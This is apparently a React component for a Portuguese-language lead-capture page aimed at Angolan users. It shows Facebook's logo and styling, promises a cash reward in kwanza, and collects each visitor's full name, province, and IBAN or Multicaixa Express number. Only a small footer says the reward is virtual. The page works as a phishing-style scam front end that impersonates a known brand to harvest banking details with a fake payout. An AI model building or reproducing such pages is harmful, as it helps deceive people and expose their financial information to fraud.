import { useState } from 'react'
import { motion } from 'framer-motion'
import { ChevronRight, User, MapPin, CreditCard, Smartphone } from 'lucide-react'

const PROVINCES = [
  'Luanda', 'Benguela', 'Huambo', 'Bié', 'Malanje', 'Huíla', 'Cabinda',
  'Uíge', 'Cuanza Sul', 'Cuanza Norte', 'Cuando Cubango', 'Cunene',
  'Lunda Norte', 'Lunda Sul', 'Moxico', 'Namibe', 'Bengo', 'Zaire',
]

export interface LeadData {
  name: string
  province: string
  method: 'iban' | 'multicaixa'
  number: string
}

interface LeadCapturePageProps {
  totalReward: number
  onSubmit: (data: LeadData) => void
}

export function LeadCapturePage({ totalReward, onSubmit }: LeadCapturePageProps) {
  const [name, setName] = useState('')
  const [province, setProvince] = useState('')
  const [method, setMethod] = useState<'iban' | 'multicaixa'>('multicaixa')
  const [number, setNumber] = useState('')
  const [errors, setErrors] = useState<Record<string, string>>({})

  const validate = () => {
    const e: Record<string, string> = {}
    if (!name.trim()) e.name = 'Insira o seu nome completo.'
    if (!province) e.province = 'Seleccione a sua província.'
    if (method === 'iban' && number.replace(/\s/g, '').length !== 21)
      e.number = 'O IBAN deve ter 21 dígitos.'
    if (method === 'multicaixa' && number.replace(/\s/g, '').length !== 9)
      e.number = 'O número Multicaixa deve ter 9 dígitos.'
    setErrors(e)
    return Object.keys(e).length === 0
  }

  const handleNumber = (val: string) => {
    const digits = val.replace(/\D/g, '')
    const max = method === 'iban' ? 21 : 9
    setNumber(digits.slice(0, max))
  }

  const handleSubmit = () => {
    if (!validate()) return
    onSubmit({ name: name.trim(), province, method, number })
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col items-center px-4 py-8 safe-top safe-bottom">
      {/* Facebook logo */}
      <img src="/images/facebook-logo.svg" alt="Facebook" className="h-10 w-auto rounded-lg mb-4" />

      <motion.div
        className="w-full max-w-[480px] space-y-4"
        initial={{ opacity: 0, y: 24 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4 }}
      >
        {/* Header card */}
        <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
          <div className="bg-[#1877F2] px-5 py-5 text-center">
            <div className="text-4xl mb-2">💰</div>
            <h2 className="text-white font-black text-xl leading-tight">
              Onde enviar os seus {totalReward.toLocaleString('pt-AO')} Kz?
            </h2>
            <p className="text-white/80 text-sm mt-1">
              Preencha os dados para receber o seu saldo virtual.
            </p>
          </div>

          <div className="px-5 py-5 space-y-4">
            {/* Name */}
            <div>
              <label className="block text-[#050505] text-sm font-semibold mb-1.5">
                <User size={14} className="inline mr-1 text-[#1877F2]" />
                Nome completo
              </label>
              <input
                type="text"
                value={name}
                onChange={e => setName(e.target.value)}
                placeholder="Ex: João Silva"
                className={`w-full border-2 rounded-xl px-4 py-3 text-sm outline-none transition-colors ${
                  errors.name ? 'border-[#E41E3F]' : 'border-[#E4E6EB] focus:border-[#1877F2]'
                }`}
              />
              {errors.name && <p className="text-[#E41E3F] text-xs mt-1">{errors.name}</p>}
            </div>

            {/* Province */}
            <div>
              <label className="block text-[#050505] text-sm font-semibold mb-1.5">
                <MapPin size={14} className="inline mr-1 text-[#1877F2]" />
                Província
              </label>
              <select
                value={province}
                onChange={e => setProvince(e.target.value)}
                className={`w-full border-2 rounded-xl px-4 py-3 text-sm outline-none transition-colors bg-white ${
                  errors.province ? 'border-[#E41E3F]' : 'border-[#E4E6EB] focus:border-[#1877F2]'
                }`}
              >
                <option value="">Seleccione a sua província</option>
                {PROVINCES.map(p => <option key={p} value={p}>{p}</option>)}
              </select>
              {errors.province && <p className="text-[#E41E3F] text-xs mt-1">{errors.province}</p>}
            </div>

            {/* Payment method */}
            <div>
              <label className="block text-[#050505] text-sm font-semibold mb-2">
                Onde pretende receber?
              </label>
              <div className="grid grid-cols-2 gap-3">
                <button
                  onClick={() => { setMethod('multicaixa'); setNumber('') }}
                  className={`flex flex-col items-center gap-1.5 py-3 rounded-xl border-2 transition-all ${
                    method === 'multicaixa'
                      ? 'border-[#1877F2] bg-[#E7F3FF]'
                      : 'border-[#E4E6EB] bg-white'
                  }`}
                >
                  <Smartphone size={20} className={method === 'multicaixa' ? 'text-[#1877F2]' : 'text-[#65676B]'} />
                  <span className={`text-xs font-bold ${method === 'multicaixa' ? 'text-[#1877F2]' : 'text-[#65676B]'}`}>
                    Multicaixa Express
                  </span>
                  <span className="text-[10px] text-[#65676B]">9 dígitos</span>
                </button>
                <button
                  onClick={() => { setMethod('iban'); setNumber('') }}
                  className={`flex flex-col items-center gap-1.5 py-3 rounded-xl border-2 transition-all ${
                    method === 'iban'
                      ? 'border-[#1877F2] bg-[#E7F3FF]'
                      : 'border-[#E4E6EB] bg-white'
                  }`}
                >
                  <CreditCard size={20} className={method === 'iban' ? 'text-[#1877F2]' : 'text-[#65676B]'} />
                  <span className={`text-xs font-bold ${method === 'iban' ? 'text-[#1877F2]' : 'text-[#65676B]'}`}>
                    IBAN
                  </span>
                  <span className="text-[10px] text-[#65676B]">21 dígitos</span>
                </button>
              </div>
            </div>

            {/* Number input */}
            <div>
              <label className="block text-[#050505] text-sm font-semibold mb-1.5">
                {method === 'iban' ? 'Número IBAN (21 dígitos)' : 'Número Multicaixa Express (9 dígitos)'}
              </label>
              <input
                type="tel"
                inputMode="numeric"
                value={number}
                onChange={e => handleNumber(e.target.value)}
                placeholder={method === 'iban' ? 'Ex: 006200003300001234567' : 'Ex: 923456789'}
                className={`w-full border-2 rounded-xl px-4 py-3 text-sm outline-none transition-colors font-mono tracking-wider ${
                  errors.number ? 'border-[#E41E3F]' : 'border-[#E4E6EB] focus:border-[#1877F2]'
                }`}
              />
              <p className="text-[#65676B] text-xs mt-1">
                {number.length} / {method === 'iban' ? 21 : 9} dígitos inseridos
              </p>
              {errors.number && <p className="text-[#E41E3F] text-xs mt-1">{errors.number}</p>}
            </div>
          </div>
        </div>

        <motion.button
          onClick={handleSubmit}
          className="w-full bg-[#31A24C] text-white font-black text-lg rounded-2xl py-5 flex items-center justify-center gap-2 shadow-lg"
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.97 }}
        >
          CONFIRMAR E RECEBER
          <ChevronRight size={22} />
        </motion.button>

        <p className="text-[#65676B] text-xs text-center pb-4 leading-snug">
          Esta é uma experiência gamificada. Os valores são virtuais e não representam dinheiro real.
        </p>
      </motion.div>
    </div>
  )
}
